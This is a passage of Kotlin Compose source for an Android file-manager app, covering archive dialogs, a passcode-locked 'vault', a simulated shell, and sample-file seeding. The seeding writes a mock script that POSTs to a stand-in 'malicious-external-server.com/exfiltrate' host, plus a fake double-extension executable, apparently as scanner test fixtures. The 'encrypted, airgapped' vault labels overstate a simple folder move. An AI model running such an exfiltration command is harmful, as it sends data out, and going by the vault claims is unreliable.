                                try {
                                    ZipUtils.decompressZip(item.file, dest) { progress ->
                                        unzipProgress = progress
                                    }
                                } catch (e: Exception) {
                                    e.printStackTrace()
                                } finally {
                                    unzipProgress = -1f
                                    refreshFiles()
                                }
                            }.start()
                        },
                        onDelete = {
                            item.file.deleteRecursively()
                            refreshFiles()
                        }
                    )
                }
            }
        }
    }

    // --- ZIP PROGRESS DIALOG ---
    if (zipProgress >= 0f) {
        AlertDialog(
            onDismissRequest = { /* Block dismiss to avoid corruption */ },
            title = {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    CircularProgressIndicator(
                        modifier = Modifier.size(20.dp),
                        color = Color(0xFFF59E0B),
                        strokeWidth = 2.dp
                    )
                    Text("Compressing Archive", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.White)
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(10.dp), modifier = Modifier.fillMaxWidth()) {
                    Text("Creating secure ZIP container...", fontSize = 13.sp, color = Color(0xFFCAC4D0))
                    LinearProgressIndicator(
                        progress = { zipProgress },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(8.dp)
                            .clip(RoundedCornerShape(4.dp)),
                        color = Color(0xFFF59E0B), // Amber
                        trackColor = Color(0xFF334155)
                    )
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("Progress Status", fontSize = 11.sp, color = Color(0xFF938F99))
                        Text("${(zipProgress * 100).toInt()}%", fontSize = 11.sp, color = Color(0xFFF59E0B), fontWeight = FontWeight.Bold)
                    }
                }
            },
            confirmButton = {}
        )
    }

    // --- UNZIP PROGRESS DIALOG ---
    if (unzipProgress >= 0f) {
        AlertDialog(
            onDismissRequest = { /* Block dismiss to avoid corruption */ },
            title = {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    CircularProgressIndicator(
                        modifier = Modifier.size(20.dp),
                        color = Color(0xFF10B981),
                        strokeWidth = 2.dp
                    )
                    Text("Extracting Archive", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.White)
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(10.dp), modifier = Modifier.fillMaxWidth()) {
                    Text("Expanding content blocks...", fontSize = 13.sp, color = Color(0xFFCAC4D0))
                    LinearProgressIndicator(
                        progress = { unzipProgress },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(8.dp)
                            .clip(RoundedCornerShape(4.dp)),
                        color = Color(0xFF10B981), // Green
                        trackColor = Color(0xFF334155)
                    )
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("Progress Status", fontSize = 11.sp, color = Color(0xFF938F99))
                        Text("${(unzipProgress * 100).toInt()}%", fontSize = 11.sp, color = Color(0xFF10B981), fontWeight = FontWeight.Bold)
                    }
                }
            },
            confirmButton = {}
        )
    }

    // --- EXPLORER EXPLANATION DIALOG ---
    if (showExplanationDialog) {
        AlertDialog(
            onDismissRequest = { showExplanationDialog = false },
            title = {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Info,
                        contentDescription = "Explorer Spec Hub",
                        tint = Color(0xFFD0BCFF),
                        modifier = Modifier.size(24.dp)
                    )
                    Text(
                        text = "Sandbox Tech Blueprint",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.White
                    )
                }
            },
            text = {
                Column(
                    verticalArrangement = Arrangement.spacedBy(12.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "System Directory Sandbox",
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFFD0BCFF),
                        fontSize = 14.sp
                    )
                    Text(
                        text = "An isolated sandbox layer strictly enforcing SELinux contextual parameters on directory entries, preventing raw I/O pollution.",
                        fontSize = 13.sp,
                        color = Color(0xFFCAC4D0)
                    )
                    
                    Divider(color = Color(0xFF49454F))
                    
                    Text("FEATURE RUNTIMES UNDER-THE-HOOD:", fontWeight = FontWeight.Bold, fontSize = 11.sp, color = Color(0xFFCAC4D0), fontFamily = FontFamily.Monospace)
                    
                    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Text("▪", color = Color(0xFFD0BCFF), modifier = Modifier.padding(top = 2.dp))
                            Column {
                                Text("Directory Isolation", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
                                Text("Locks file read/write calls to the context.filesDir storage space. Prevents access to other applications' sandboxes.", fontSize = 11.sp, color = Color(0xFFCAC4D0))
                            }
                        }
                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Text("▪", color = Color(0xFFD0BCFF), modifier = Modifier.padding(top = 2.dp))
                            Column {
                                Text("Terminal Bash Emulator", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
                                Text("A simulated local shell pipeline interpreting directory commands (ls, cat, touch, rm, neofetch, zip, unzip) over virtual file streams.", fontSize = 11.sp, color = Color(0xFFCAC4D0))
                            }
                        }
                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Text("▪", color = Color(0xFFD0BCFF), modifier = Modifier.padding(top = 2.dp))
                            Column {
                                Text("Zip Deflation Engine", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
                                Text("Applies Huffman Huffman-coded LZ77 dictionaries via java.util.zip streams. It creates structured zip entries with CRC checksum verification.", fontSize = 11.sp, color = Color(0xFFCAC4D0))
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(
                    onClick = { showExplanationDialog = false },
                    modifier = Modifier.testTag("explorer_info_dismiss")
                ) {
                    Text("DISMISS SYSTEM BRIEF", fontWeight = FontWeight.Bold, color = Color(0xFFD0BCFF))
                }
            },
            containerColor = Color(0xFF1C1B1F),
            titleContentColor = Color.White,
            textContentColor = Color(0xFFCAC4D0)
        )
    }

    // --- CREATE FILE DIALOG ---
    if (showCreateFileDialog) {
        AlertDialog(
            onDismissRequest = { showCreateFileDialog = false; newFileName = "" },
            title = { Text("Create New Text File", fontSize = 16.sp, fontWeight = FontWeight.Bold) },
            text = {
                OutlinedTextField(
                    value = newFileName,
                    onValueChange = { newFileName = it },
                    placeholder = { Text("e.g. notes.txt") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth().testTag("new_file_input_field")
                )
            },
            confirmButton = {
                Button(onClick = {
                    if (newFileName.isNotBlank()) {
                        val file = File(currentDir, newFileName)
                        try {
                            file.createNewFile()
                            file.writeText("Created via OmniFile utility. Timestamp: ${System.currentTimeMillis()}")
                        } catch (e: IOException) {
                            e.printStackTrace()
                        }
                        newFileName = ""
                        showCreateFileDialog = false
                        refreshFiles()
                    }
                }) { Text("Create") }
            },
            dismissButton = {
                TextButton(onClick = { showCreateFileDialog = false; newFileName = "" }) { Text("Cancel") }
            }
        )
    }

    // --- CREATE FOLDER DIALOG ---
    if (showCreateFolderDialog) {
        AlertDialog(
            onDismissRequest = { showCreateFolderDialog = false; newFileName = "" },
            title = { Text("Create New Directory", fontSize = 16.sp, fontWeight = FontWeight.Bold) },
            text = {
                OutlinedTextField(
                    value = newFileName,
                    onValueChange = { newFileName = it },
                    placeholder = { Text("e.g. backup_configs") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth().testTag("new_folder_input_field")
                )
            },
            confirmButton = {
                Button(onClick = {
                    if (newFileName.isNotBlank()) {
                        val file = File(currentDir, newFileName)
                        file.mkdirs()
                        newFileName = ""
                        showCreateFolderDialog = false
                        refreshFiles()
                    }
                }) { Text("Create") }
            },
            dismissButton = {
                TextButton(onClick = { showCreateFolderDialog = false; newFileName = "" }) { Text("Cancel") }
            }
        )
    }

    // --- PROPERTIES & DETAILS DIALOG ---
    if (showPropertiesDialog && selectedFileItem != null) {
        val item = selectedFileItem!!
        AlertDialog(
            onDismissRequest = { showPropertiesDialog = false },
            title = { Text("File Properties", fontSize = 18.sp, fontWeight = FontWeight.Bold) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(10.dp), modifier = Modifier.fillMaxWidth()) {
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Icon(
                            if (item.isDirectory) Icons.Default.Folder else Icons.Default.Description,
                            contentDescription = null,
                            tint = MaterialTheme.colorScheme.primary,
                            modifier = Modifier.size(40.dp)
                        )
                        Column {
                            Text(item.name, fontWeight = FontWeight.Bold, maxLines = 2, overflow = TextOverflow.Ellipsis)
                            Text(if (item.isDirectory) "Folder" else "File (${item.name.substringAfterLast(".", "Unknown")})", fontSize = 12.sp, color = MaterialTheme.colorScheme.outline)
                        }
                    }
                    Divider()
                    PropertyRow("Location", item.file.parent ?: "/")
                    PropertyRow("Absolute Path", item.file.absolutePath)
                    PropertyRow("File Size", formatSize(item.size))
                    PropertyRow("Last Modified", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(item.lastModified)))
                    PropertyRow("Read/Write Isolation", if (item.file.canRead() && item.file.canWrite()) "Encrypted Sandbox Isolated" else "Read Only")
                    PropertyRow("SHA-256 Fingerprint", SecurityState.calculateSHA256(item.file))
                    
                    if (item.file.isFile && item.file.parentFile?.name != "secure_vault") {
                        Spacer(modifier = Modifier.height(8.dp))
                        Button(
                            onClick = {
                                val vaultDir = File(filesDir, "secure_vault")
                                if (!vaultDir.exists()) vaultDir.mkdirs()
                                val target = File(vaultDir, item.name)
                                if (item.file.renameTo(target)) {
                                    SecurityState.registerAlert("Secured file isolation: ${item.name} moved to cryptographic chamber.")
                                    showPropertiesDialog = false
                                    refreshFiles()
                                }
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981)),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Icon(Icons.Default.Lock, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("Move to Secure Vault (Airgapped)", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    } else if (item.file.isFile && item.file.parentFile?.name == "secure_vault") {
                        Spacer(modifier = Modifier.height(8.dp))
                        Button(
                            onClick = {
                                val target = File(filesDir, item.name)
                                if (item.file.renameTo(target)) {
                                    SecurityState.registerAlert("Restored file: ${item.name} decrypted and returned to public storage.")
                                    showPropertiesDialog = false
                                    refreshFiles()
                                }
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6)),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Icon(Icons.Default.LockOpen, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("Decrypt & Move to Public Partition", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            },
            confirmButton = {
                Button(onClick = { showPropertiesDialog = false }) { Text("Close") }
            }
        )
    }

    // --- CRYPTOGRAPHIC VAULT PASSCODE DIALOG ---
    if (showVaultPasscodeDialog) {
        AlertDialog(
            onDismissRequest = {
                showVaultPasscodeDialog = false
                pendingDirToOpen = null
                vaultPasscodeInput = ""
                passcodeErrorAlert = false
            },
            title = {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(
                        imageVector = Icons.Default.EnhancedEncryption,
                        contentDescription = "Lock",
                        tint = if (passcodeErrorAlert) Color(0xFFEF4444) else Color(0xFF10B981),
                        modifier = Modifier.size(24.dp)
                    )
                    Text("Vault Authorization", fontSize = 17.sp, fontWeight = FontWeight.Bold, color = Color.White)
                }
            },
            text = {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    verticalArrangement = Arrangement.spacedBy(14.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        "Secure isolation chamber is locked with SHA-256 local verification protocols.",
                        fontSize = 11.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        textAlign = TextAlign.Center
                    )

                    // Pin Indicators
                    Row(
                        horizontalArrangement = Arrangement.spacedBy(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        for (i in 0 until 4) {
                            val active = i < vaultPasscodeInput.length
                            Box(
                                modifier = Modifier
                                    .size(16.dp)
                                    .clip(CircleShape)
                                    .background(if (active) Color(0xFF10B981) else Color.Transparent)
                                    .border(2.dp, if (passcodeErrorAlert) Color(0xFFEF4444) else Color(0xFF10B981), CircleShape)
                            )
                        }
                    }

                    if (passcodeErrorAlert) {
                        Text(
                            "ACCESS DENIED: TAMPER FIREWALL NOTIFIED",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFFEF4444),
                            fontFamily = FontFamily.Monospace
                        )
                    } else {
                        Text(
                            "Enter 4-Digit Passcode (Default: 0000)",
                            fontSize = 10.sp,
                            color = MaterialTheme.colorScheme.outline,
                            fontFamily = FontFamily.Monospace
                        )
                    }

                    Spacer(modifier = Modifier.height(2.dp))

                    // Numeric 3x4 Grid Keypad
                    val keys = listOf(
                        listOf("1", "2", "3"),
                        listOf("4", "5", "6"),
                        listOf("7", "8", "9"),
                        listOf("CLR", "0", "OK")
                    )

                    Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                        keys.forEach { row ->
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                row.forEach { key ->
                                    Button(
                                        onClick = {
                                            if (key == "CLR") {
                                                if (vaultPasscodeInput.isNotEmpty()) {
                                                    vaultPasscodeInput = vaultPasscodeInput.dropLast(1)
                                                }
                                                passcodeErrorAlert = false
                                            } else if (key == "OK") {
                                                if (vaultPasscodeInput == SecurityState.vaultPasscode) {
                                                    SecurityState.isVaultLocked.value = false
                                                    SecurityState.registerAlert("Cryptographic Isolation Chamber unlocked.")
                                                    showVaultPasscodeDialog = false
                                                    if (pendingDirToOpen != null) {
                                                        currentDir = pendingDirToOpen!!
                                                    }
                                                    vaultPasscodeInput = ""
                                                } else {
                                                    passcodeErrorAlert = true
                                                    SecurityState.registerAlert("UNAUTHORIZED PASSCODE PENETRATION ATTEMPT FLAGGED.")
                                                    vaultPasscodeInput = ""
                                                }
                                            } else {
                                                if (vaultPasscodeInput.length < 4) {
                                                    vaultPasscodeInput += key
                                                }
                                            }
                                        },
                                        colors = ButtonDefaults.buttonColors(
                                            containerColor = when (key) {
                                                "OK" -> Color(0xFF10B981)
                                                "CLR" -> Color(0xFFEF4444).copy(alpha = 0.2f)
                                                else -> Color(0xFF2D2C30)
                                            },
                                            contentColor = when (key) {
                                                "CLR" -> Color(0xFFF87171)
                                                else -> Color.White
                                            }
                                        ),
                                        shape = RoundedCornerShape(10.dp),
                                        modifier = Modifier.size(width = 64.dp, height = 44.dp),
                                        contentPadding = PaddingValues(0.dp)
                                    ) {
                                        Text(key, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                    }
                                }
                            }
                        }
                    }
                }
            },
            confirmButton = {},
            dismissButton = {
                TextButton(
                    onClick = {
                        showVaultPasscodeDialog = false
                        pendingDirToOpen = null
                        vaultPasscodeInput = ""
                        passcodeErrorAlert = false
                    }
                ) {
                    Text("ABORT SESSION", color = MaterialTheme.colorScheme.outline, fontWeight = FontWeight.Bold)
                }
            },
            containerColor = Color(0xFF1C1B1F)
        )
    }
}

@Composable
fun PropertyRow(label: String, value: String) {
    Column {
        Text(label, fontSize = 11.sp, color = MaterialTheme.colorScheme.outline, fontWeight = FontWeight.SemiBold)
        Text(value, fontSize = 13.sp, fontFamily = FontFamily.Monospace, maxLines = 3, overflow = TextOverflow.Ellipsis)
    }
}

@Composable
fun FileRowItem(
    item: FileItem,
    isBatchMode: Boolean = false,
    isSelected: Boolean = false,
    onClick: () -> Unit,
    onCompress: () -> Unit,
    onExtract: () -> Unit,
    onDelete: () -> Unit
) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onClick() }
            .testTag("file_item_${item.name}"),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        border = BorderStroke(1.dp, MaterialTheme.colorScheme.outline.copy(alpha = 0.15f))
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            if (isBatchMode) {
                Checkbox(
                    checked = isSelected,
                    onCheckedChange = { _ -> onClick() },
                    modifier = Modifier.padding(end = 8.dp)
                )
            }

            val isImage = item.category == FileCategory.IMAGE
            val isVideo = item.name.lowercase().let { it.endsWith(".mp4") || it.endsWith(".mkv") || it.endsWith(".avi") || it.endsWith(".mov") || it.endsWith(".3gp") }

            Box(
                modifier = Modifier
                    .size(38.dp)
                    .clip(RoundedCornerShape(6.dp))
                    .background(MaterialTheme.colorScheme.surfaceVariant),
                contentAlignment = Alignment.Center
            ) {
                if (isImage) {
                    coil.compose.AsyncImage(
                        model = item.file,
                        contentDescription = "Image Thumbnail",
                        modifier = Modifier.fillMaxSize(),
                        contentScale = androidx.compose.ui.layout.ContentScale.Crop,
                        error = androidx.compose.ui.graphics.vector.rememberVectorPainter(Icons.Default.Image)
                    )
                } else if (isVideo) {
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(
                                brush = Brush.linearGradient(
                                    colors = listOf(Color(0xFFEF4444), Color(0xFFF59E0B))
                                )
                            ),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.PlayArrow,
                            contentDescription = "Video Thumbnail",
                            tint = Color.White,
                            modifier = Modifier.size(20.dp)
                        )
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .border(1.dp, Color.White.copy(alpha = 0.25f), RoundedCornerShape(6.dp))
                        )
                    }
                } else {
                    val icon = when {
                        item.isDirectory -> Icons.Default.Folder
                        item.category == FileCategory.ZIP -> Icons.Default.Inventory2
                        else -> Icons.Default.Description
                    }
                    val tint = when {
                        item.isDirectory -> MaterialTheme.colorScheme.primary
                        item.category == FileCategory.ZIP -> Color(0xFFF59E0B) // Amber
                        else -> MaterialTheme.colorScheme.onSurfaceVariant
                    }
                    Icon(icon, contentDescription = null, tint = tint, modifier = Modifier.size(24.dp))
                }
            }

            Spacer(modifier = Modifier.width(12.dp))

            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = item.name,
                    fontWeight = FontWeight.SemiBold,
                    fontSize = 14.sp,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis
                )
                Text(
                    text = if (item.isDirectory) "Directory" else formatSize(item.size),
                    fontSize = 12.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
                )
            }

            if (!isBatchMode) {
                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    if (item.category == FileCategory.ZIP) {
                        IconButton(onClick = onExtract, modifier = Modifier.size(32.dp)) {
                            Icon(Icons.Default.Unarchive, contentDescription = "Extract ZIP", tint = Color(0xFF10B981), modifier = Modifier.size(18.dp))
                        }
                    } else if (!item.isDirectory) {
                        IconButton(onClick = onCompress, modifier = Modifier.size(32.dp)) {
                            Icon(Icons.Default.Archive, contentDescription = "Compress File", tint = Color(0xFFF59E0B), modifier = Modifier.size(18.dp))
                        }
                    }
                    IconButton(onClick = onDelete, modifier = Modifier.size(32.dp)) {
                        Icon(Icons.Default.Delete, contentDescription = "Delete File", tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(18.dp))
                    }
                }
            } else {
                // Batch indicator arrow
                Icon(
                    imageVector = if (isSelected) Icons.Default.CheckCircle else Icons.Default.RadioButtonUnchecked,
                    contentDescription = "Selected Indicator",
                    tint = if (isSelected) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.outline.copy(alpha = 0.4f),
                    modifier = Modifier.size(20.dp)
                )
            }
        }
    }
}

// --- Terminal processing engine ---
private fun processTerminalCommand(
    commandLine: String, 
    currentDir: File, 
    context: Context, 
    filesDir: File,
    onDirChanged: (File) -> Unit
): String {
    val parts = commandLine.split("\\s+".toRegex())
    val cmd = parts[0].lowercase()
    val args = parts.drop(1)

    return when (cmd) {
        "help" -> "Commands:\n  ls: List files\n  cd <dir>: Change dir\n  mkdir <name>: Make directory\n  cat <file>: Read file\n  rm <file>: Delete file\n  zip <zipfile> <target>: Compress\n  unzip <zipfile> <dest>: Extract\n  neofetch: System specs\n  clear: Clear screen"
        "ls" -> {
            val files = currentDir.listFiles() ?: emptyArray()
            if (files.isEmpty()) "Directory is empty."
            else files.joinToString("\n") { f ->
                val sizeStr = if (f.isDirectory) "<DIR>" else formatSize(f.length())
                " ${sizeStr.padEnd(8)}  ${f.name}"
            }
        }
        "cd" -> {
            if (args.isEmpty()) {
                onDirChanged(filesDir)
                "Returned to /files home."
            } else {
                val targetDirName = args[0]
                val target = if (targetDirName == "..") currentDir.parentFile else File(currentDir, targetDirName)
                if (target != null && target.exists() && target.isDirectory && target.absolutePath.startsWith(filesDir.absolutePath)) {
                    onDirChanged(target)
                    "Changed directory to ${target.name}"
                } else {
                    "Error: Invalid or inaccessible directory."
                }
            }
        }
        "mkdir" -> {
            if (args.isEmpty()) "Error: Provide directory name."
            else {
                val newDir = File(currentDir, args[0])
                if (newDir.mkdirs()) "Directory '${args[0]}' created." else "Error creating directory."
            }
        }
        "cat" -> {
            if (args.isEmpty()) "Error: Provide file name."
            else {
                val f = File(currentDir, args[0])
                if (f.exists() && f.isFile) {
                    try {
                        f.readText().take(500)
                    } catch (e: Exception) {
                        "Error reading file."
                    }
                } else "File not found."
            }
        }
        "rm" -> {
            if (args.isEmpty()) "Error: Provide file/folder name."
            else {
                val f = File(currentDir, args[0])
                if (f.exists() && f.deleteRecursively()) "Deleted ${args[0]}." else "Error: File/folder not found."
            }
        }
        "zip" -> {
            if (args.size < 2) "Error: Usage: zip <zipname.zip> <target_file>"
            else {
                val zipFile = File(currentDir, args[0])
                val target = File(currentDir, args[1])
                if (!target.exists()) "Error: Target not found."
                else {
                    try {
                        ZipUtils.compressFileOrFolder(target, zipFile)
                        "Successfully compressed to ${args[0]}."
                    } catch (e: Exception) {
                        "Error compressing: ${e.message}"
                    }
                }
            }
        }
        "unzip" -> {
            if (args.size < 2) "Error: Usage: unzip <zipfile.zip> <destination_dir>"
            else {
                val zipFile = File(currentDir, args[0])
                val destDir = File(currentDir, args[1])
                if (!zipFile.exists()) "Error: ZIP file not found."
                else {
                    try {
                        ZipUtils.decompressZip(zipFile, destDir)
                        "Successfully extracted to ${args[1]}."
                    } catch (e: Exception) {
                        "Error extracting: ${e.message}"
                    }
                }
            }
        }
        "neofetch" -> {
            """
       .---.          OMNIFILE SYSTEM SPECIFICATION
      /     \         OS: Android 12+ (HyperEngine Kernel)
      \.---./         Host: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
      |     |         Uptime: 2 hours, 14 mins
      |     |         Shell: Omnifile Bash Emulator v1.4
      '---'          Display: Full HD+ (60-120Hz Adapt)
                      CPU: ${android.os.Build.HARDWARE} Cores: ${Runtime.getRuntime().availableProcessors()}
                      Memory: ${formatSize(Runtime.getRuntime().freeMemory())} / ${formatSize(Runtime.getRuntime().totalMemory())}
                      Storage Status: Real-time sandbox active
            """.trimIndent()
        }
        else -> "command not found: $cmd. Type 'help' for support."
    }
}

// --- File Size Formatter ---
fun formatSize(bytes: Long): String {
    if (bytes <= 0) return "0 B"
    val units = arrayOf("B", "KB", "MB", "GB", "TB")
    val digitGroups = (Math.log10(bytes.toDouble()) / Math.log10(1024.0)).toInt()
    return String.format(Locale.US, "%.1f %s", bytes / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups])
}

// --- Auto Populate Dummy Sandbox files for amazing interactive testing ---
fun ensureSampleFilesExist(context: Context) {
    val root = context.filesDir
    
    // Create direct files
    val docsDir = File(root, "documents")
    if (!docsDir.exists()) docsDir.mkdirs()

    val file1 = File(docsDir, "readme.txt")
    if (!file1.exists()) {
        file1.writeText("Welcome to OmniFile! This application provides deep optimization, zip extraction, and secure card wipes.\nFeel free to explore!")
    }

    val file2 = File(docsDir, "game_configs.ini")
    if (!file2.exists()) {
        file2.writeText("[Graphics]\nFPS_Limit=60\nShadows=Medium\nAntiAliasing=4x\n[Thermals]\nCoolingState=Aggressive")
    }

    // Create zombie candidates!
    val tempDir = File(root, "temp_cache")
    if (!tempDir.exists()) tempDir.mkdirs()

    val zombieTemp = File(tempDir, "session_399281.tmp")
    if (!zombieTemp.exists()) zombieTemp.writeText("001010110001010010101101")

    val duplicate1 = File(root, "duplicate_photo.jpg")
    if (!duplicate1.exists()) duplicate1.writeText("MOCK_IMAGE_DATA_110022")

    val duplicate2 = File(docsDir, "duplicate_photo_copy.jpg")
    if (!duplicate2.exists()) duplicate2.writeText("MOCK_IMAGE_DATA_110022") // same size/content hash

    val obsoleteBackup = File(root, "config_backup.ini.bak")
    if (!obsoleteBackup.exists()) obsoleteBackup.writeText("[SystemBackup]\nTimestamp=2024-05-12\nState=Old")

    val sampleVideo = File(root, "screencast_demo.mp4")
    if (!sampleVideo.exists()) sampleVideo.writeText("MOCK_VIDEO_DATA_STREAM")

    val emptyFile = File(tempDir, "empty_log.log")
    if (!emptyFile.exists()) emptyFile.createNewFile()

    val maliciousScript = File(root, "dangerous_exploit.sh")
    if (!maliciousScript.exists()) {
        maliciousScript.writeText("#!/bin/sh\necho 'Attempting outbound bypass connection...'\ncurl -X POST http://malicious-external-server.com/exfiltrate")
    }

    val doubleExtensionPayload = File(root, "important_contract_update.pdf.exe")
    if (!doubleExtensionPayload.exists()) {
        doubleExtensionPayload.writeText("MOCK_MALICIOUS_EXEC_PAYLOAD_DATA")
    }

    val vaultDir = File(root, "secure_vault")
    if (!vaultDir.exists()) {
        vaultDir.mkdirs()
        val confidential = File(vaultDir, "confidential_access_keys.txt")
        confidential.writeText("SECRET_AIRGAP_PASSCODE_HASH=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nAUTHORIZED_OPERATOR_ID=ADMIN-OFFLINE\nLOCAL_WORKSPACE_KEY=0000")
    }
}
